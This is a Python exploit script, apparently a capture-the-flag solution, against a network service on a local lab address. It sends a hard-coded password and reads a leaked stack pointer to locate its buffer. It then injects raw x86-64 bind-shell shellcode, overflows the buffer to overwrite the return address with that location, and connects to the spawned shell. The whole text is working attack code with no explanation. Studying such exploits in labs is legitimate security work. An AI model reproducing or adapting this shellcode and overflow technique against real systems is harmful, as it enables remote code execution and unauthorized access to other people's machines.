import random
import sys
import struct

sys.path.append('/Users/lucas/ctf/tools')

import ctf

shell_port = random.randint(4444, 2**16-1)

shellcode = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a" + \
            "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0" + \
            "\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02" + \
            struct.pack('>H', shell_port) + \
            "\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05" + \
            "\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31" + \
            "\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59" + \
            "\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48" + \
            "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a" + \
            "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54" + \
            "\x5f\x6a\x3b\x58\x0f\x05"


HOST = '192.168.221.128'
PORT = 4444

def main():
    s = ctf.connect(HOST,PORT)

    # password
    ctf.send(s, 'NowIsTheWinterOfOurDiscountTent\n')

    ctf.recv(s)

    ctf.send(s, '\n')

    diff_to_buff=1088
    welcome_string = ctf.recv(s)
    
    ptr_raw = welcome_string[9:15] + '\x00' * 2
    leaked_ptr = struct.unpack('Q', ptr_raw)[0]

    our_buf = leaked_ptr-diff_to_buff
    print('leaked_ptr = %X' % leaked_ptr)
    print('buf @ 0x%X' % our_buf)

    ctf.send(s, shellcode)
    ctf.send(s, 'A' * (0x420-len(shellcode)), dump=False)
    ctf.send(s, 'B' * 8)
    ctf.send(s, struct.pack('Q', our_buf))
    ctf.send(s,'\n')
    ctf.recv(s)

    ctf.shell(HOST, shell_port)

    s.close()

if __name__ == '__main__':
    main()
